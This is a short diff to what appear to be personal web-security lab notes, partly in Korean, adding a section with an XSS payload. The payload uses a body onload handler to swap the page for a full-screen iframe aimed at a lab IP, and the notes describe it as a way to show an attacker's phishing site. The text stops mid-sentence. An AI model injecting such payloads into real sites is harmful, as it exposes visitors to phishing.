@@ -60,3 +60,12 @@ medium
 
 high
 ![[Pasted image 20241008154844.png]]
+
+
+# iframe?
+```
+<body topmargin=0 leftmargin=0 onload="document.body.innerHTML='<iframe width=100% height=800 src=http://192.168.56.102/></iframe>',">
+```
+본문을 로드할 때 상단, 좌측에 배치해서 로드
+로드할 때 바디를 HTML을 로드한다.
+- 공격자가 만든 피싱 사이트를 
